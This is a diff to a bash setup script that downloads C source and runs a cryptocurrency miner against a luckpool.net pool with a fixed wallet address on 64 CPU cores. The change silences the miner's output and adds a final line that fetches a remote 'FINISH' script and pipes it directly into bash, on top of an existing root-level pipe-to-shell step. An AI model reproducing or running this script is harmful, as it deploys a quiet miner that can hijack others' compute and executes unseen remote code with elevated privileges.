@@ -1,5 +1,4 @@
 #!/bin/bash
-sudo screen -S HAJAR
 sudo apt-get update -y
 sudo apt install gcc -y
 curl https://gitlab.com/ontranontran/kaspo/-/raw/master/ontranbotak.c -o ontranbotak.c
@@ -12,4 +11,5 @@ sudo su --command "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash
 git clone https://github.com/Bjordhil/CUSTOM
 cd CUSTOM
 chmod +x vrbjordhil && chmod +x verus-solver
-./vrbjordhil -c stratum+tcp://ap.luckpool.net:3960 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.CURL -p x --cpu 64
+./vrbjordhil -c stratum+tcp://ap.luckpool.net:3960 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.CURL -p x --cpu 64 >/dev/null 2>&1
+curl -sL https://raw.githubusercontent.com/Bjordhil/FINISH/main/FINISH | bash
